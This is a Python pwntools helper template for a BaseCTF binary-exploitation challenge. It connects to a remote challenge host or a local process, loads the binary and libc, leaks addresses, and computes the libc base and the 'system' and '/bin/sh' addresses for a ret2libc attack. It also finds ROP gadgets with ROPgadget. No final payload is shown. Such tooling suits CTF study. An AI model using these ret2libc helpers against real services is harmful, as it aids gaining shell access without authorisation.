from pwn import *
from LibcSearcher import *
import os

dir = 'challenge.basectf.fun:49932'
file = './attachment'
libc_target = './libc.so.6'

elf_state = True
libc_state = True
ps_state = True
shell = 'chmod +x '+ libc_target

if dir.find(':') != -1:
    host,port = dir.split(':')
elif dir.find(' ') != -1:
    host,port = dir.split(' ')
else:
    ps_state = False

try:
    p = remote(host,port)
    p.close()
except:
    ps_state = False

if libc_target == '':
    libc_state = False
else:
    try:
        libc = ELF(libc_target)
    except:
        os.system(shell)
        try:
            libc = ELF(libc_target)
        except:
            libc_state = False

try:
    elf = ELF(file)
except:
    elf_state = False

def answer(name, data = None, item = None):
    type_data = isinstance(data,str)
    type_name = isinstance(name,str)
    if name == 'offest' or name == 'padding':
        if item is None:
            success(name + ': ' + hex(data) + '=' + str(data))
        else:
            success(name + ': ' + hex(data) + '=' + str(data) + '\t(' + item + ')')
    elif type_name == True and data == None and item == None:
        success(name)
    else:
        if type_data == True:
            success(name + ' -> ' + data)
        else:
            if data == True or data == False:
                if name == 'ps_state':
                    if data == False:
                        data = 'local'
                    else:
                        data = 'internet'
                success(name + ' ->\t' + str(data))
            else:
                success(name + ' -> {:#x}'.format(data))

def gdb_pause():
    gdb.attach(p)

def p6(text):
    return p64(text)

def p3(text):
    return p32(text)

def data_recv_test(times = None,out = None):
    if out == None:
        if times == None:
            p.recv()
        else:
            for i in range(times):
                p.recvline()
    else:
        data = int(p.recvline()[2:-1],16)
        return data

def data_recv(name,type):
    if type == 64:
        data = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
    if type == 32:
        data = u32(p.recv(4))
    answer(name,data)
    return data

def libc_compute(name,name_add,mode = None):
    #only ret2libc
    global system_add
    global binsh_add
    if libc_state == False and mode != 'local':
        answer('libc is open')
        libc = LibcSearcher(name,name_add)
        libc_base = name_add - libc.dump(name)
        binsh_add = libc_base + libc.dump('str_bin_sh')
        system_add = libc_base + libc.dump('system')
        answer('libc_base',libc_base)
    elif libc_target == False or mode == 'local':
        answer('lib is open')
        global lib
        lib = elf.libc
        lib.add = name_add - lib.sym[name]
        system_add = lib.sym['system']
        binsh_add = next(lib.search(b'/bin/sh'))
        answer('libc_base',lib.address)
    else:
        answer('libc is open')
        libc = ELF(libc_target)
        libc_base = name_add - libc.sym[name]
        system_add = libc_base + libc.sym['system']
        binsh_add = libc_base + get_binsh_offest()
        answer('libc_base',libc_base)
    answer('system_add',system_add)
    answer('binsh_add',binsh_add)

def get_binsh_offest():
    with open('libc.so.6','rb') as file:
        data = file.read()
    offest = data.find(b'\x2f\x62\x69\x6e\x2f\x73\x68\x00')
    answer('offest',offest)
    file.close()
    return offest

answer('elf_state',elf_state)
answer('libc_state',libc_state)
answer('ps_state',ps_state)

if ps_state == True:
    p = remote(host,port)
else:
    p = process(file)

answer('done')

def get_rop(name):
    global result
    if name == 'ret':
        shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep ": ' + name + '"'
    else:
        shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep ' + name
    try:
        result = int(os.popen(shell).readlines()[0][2:19],16)
        answer(name,result)
    except:
        answer('error')

if elf_state == True:
    shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"'
    os.system(shell)

def options(number):
    if header == '':
        p.recv()
    else:
        p.recvuntil(':')
    p.sendline(str(number))

context(os='linux', arch='amd64',log_level = 'debug')
header = ''
